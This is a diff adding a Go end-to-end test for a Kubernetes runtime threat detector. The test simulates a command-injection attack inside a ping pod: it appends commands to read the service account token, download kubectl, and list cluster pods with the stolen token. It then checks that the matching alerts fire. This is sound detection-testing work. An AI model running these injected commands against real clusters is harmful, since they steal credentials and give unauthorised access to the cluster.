@@ -556,3 +556,100 @@ func Test_09_FalsePositiveTest(t *testing.T) {
 
 	assert.Equal(t, 0, len(alerts), "Expected no alerts to be generated, but got %d alerts", len(alerts))
 }
+
+func Test_10_DemoTest(t *testing.T) {
+	start := time.Now()
+	defer tearDownTest(t, start)
+
+	//testutils.IncreaseNodeAgentSniffingTime("2m")
+
+	wl, err := testutils.NewTestWorkload("default", path.Join(utils.CurrentDir(), "resources/ping-app.yaml"))
+	// if err != nil {
+	// 	t.Errorf("Error creating workload: %v", err)
+	// }
+	assert.NoError(t, wl.WaitForReady(80))
+	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4"}, "")
+	err = wl.WaitForApplicationProfileCompletion(80)
+	if err != nil {
+		t.Errorf("Error waiting for application profile to be completed: %v", err)
+	}
+	assert.NoError(t, wl.WaitForNetworkNeighborhood(80, "ready"))
+	err = wl.WaitForNetworkNeighborhoodCompletion(80)
+	if err != nil {
+		t.Errorf("Error waiting for network neighborhood to be completed: %v", err)
+	}
+
+	// Do an ls command using command injection in the ping command
+	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;ls"}, "")
+	if err != nil {
+		t.Errorf("Error executing remote command: %v", err)
+	}
+
+	// Do a cat command using command injection in the ping command
+	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;cat /run/secrets/kubernetes.io/serviceaccount/token"}, "")
+	if err != nil {
+		t.Errorf("Error executing remote command: %v", err)
+	}
+
+	// Do a uname command using command injection in the ping command
+	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g'"}, "")
+	if err != nil {
+		t.Errorf("Error executing remote command: %v", err)
+	}
+
+	// Download kubectl
+	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\""}, "")
+	if err != nil {
+		t.Errorf("Error executing remote command: %v", err)
+	}
+
+	// Sleep for 10 seconds to wait for the kubectl download
+	time.Sleep(10 * time.Second)
+
+	// Make kubectl executable
+	_, _, err = wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;chmod +x kubectl"}, "")
+	if err != nil {
+		t.Errorf("Error executing remote command: %v", err)
+	}
+
+	// Get the pods in the cluster
+	output, _, err := wl.ExecIntoPod([]string{"sh", "-c", "ping 1.1.1.1 -c 4;./kubectl --server https://kubernetes.default --insecure-skip-tls-verify --token $(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods"}, "")
+	if err != nil {
+		t.Errorf("Error executing remote command: %v", err)
+	}
+
+	// Check that the output contains the pod-ping-app pod
+	assert.Contains(t, output, "ping-app", "Expected output to contain 'ping-app'")
+
+	// Get the alerts and check that the alerts are generated
+	alerts, err := testutils.GetAlerts(wl.Namespace)
+	if err != nil {
+		t.Errorf("Error getting alerts: %v", err)
+	}
+
+	// Validate that all alerts are signaled
+	expectedAlerts := map[string]bool{
+		"Unexpected process launched": false,
+		"Unexpected file access":      false,
+		"Kubernetes Client Executed":  false,
+		// "Exec from malicious source":               false,
+		"Exec Binary Not In Base Image":           false,
+		"Unexpected Service Account Token Access": false,
+		"Unexpected domain request":               false,
+	}
+
+	for _, alert := range alerts {
+		ruleName, ruleOk := alert.Labels["rule_name"]
+		if ruleOk {
+			if _, exists := expectedAlerts[ruleName]; exists {
+				expectedAlerts[ruleName] = true
+			}
+		}
+	}
+
+	for ruleName, signaled := range expectedAlerts {
+		if !signaled {
+			t.Errorf("Expected alert '%s' was not signaled", ruleName)
+		}
+	}
+}
